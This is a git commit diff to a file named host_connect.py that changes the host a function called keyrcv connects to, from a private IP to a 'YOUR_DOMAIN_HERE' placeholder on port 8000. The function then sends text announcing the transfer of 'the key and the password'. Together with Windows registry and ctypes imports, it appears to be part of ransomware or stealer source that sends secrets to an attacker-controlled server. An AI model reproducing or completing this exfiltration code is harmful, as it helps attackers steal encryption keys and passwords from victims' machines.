2e7a9f6359585dcbaed57fc858fc61809dd2f455
ThomasPoirier-CS <70718793+ThomasPoirier-CS@users.noreply.github.com>
2020-10-28 21:52:20 +0100

    Update host_connect.py

--- modules/network/host_connect.py
+++ modules/network/host_connect.py
@@ -6,7 +6,7 @@ import os, sys, socket, wget, struct, ctypes, shutil, time, winreg
 def keyrcv():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(("192.168.1.16", 8000))
+        sock.connect(("YOUR_DOMAIN_HERE", 8000))
         enter = "[!] Transfert the key and the password :\n "
         exit = "\n[!] Transfert [OK]"
         sock.send(enter.encode())
